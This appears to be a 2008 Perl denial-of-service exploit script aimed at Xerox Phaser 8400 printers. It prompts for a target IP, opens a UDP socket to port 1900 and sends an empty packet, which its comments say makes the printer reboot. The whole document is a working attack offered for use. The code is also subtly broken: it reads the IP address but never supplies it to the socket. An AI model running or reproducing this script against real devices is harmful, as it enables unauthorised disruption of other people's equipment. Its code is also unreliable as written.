# Xerox_Remote_DoS.20080801.ver01 (tanx to dr0pz0N3 for reminding me to close my #$*&amp;*! s0ck3t)
# Make: Xerox
# Model: Phaser 8400
# Firmware: 03/03/2004
#
# What's the deal?
# Apparently, if you send an empty packet to a Xerox Phaser 8400 printer
# the printer will reboot.  Tested successfully on four printers.
# 

# Let's not leave our maliciousness open to exploitation and errors!

# What's your printer's IP Address?
print &quot;Please enter the printers IP:\n&quot;;
my $ipaddr = &lt;STDIN&gt;;

# Let's setup the connection...
my $socket = IO::Socket::INET-&gt;new(
 PeerPort =&gt; 1900,

 Proto =&gt; &quot;udp&quot; )
 or die &quot;I tried. Maybe you entered the wrong IP?\n Maybe it's just my bad code...\n In any case, check: $@\n\n&quot;;

# Okay... Let's kill it.
$socket-&gt;send(&quot;&quot;);
$socket-&gt;close();

print &quot;Done. It should have died.\n\n&quot;;
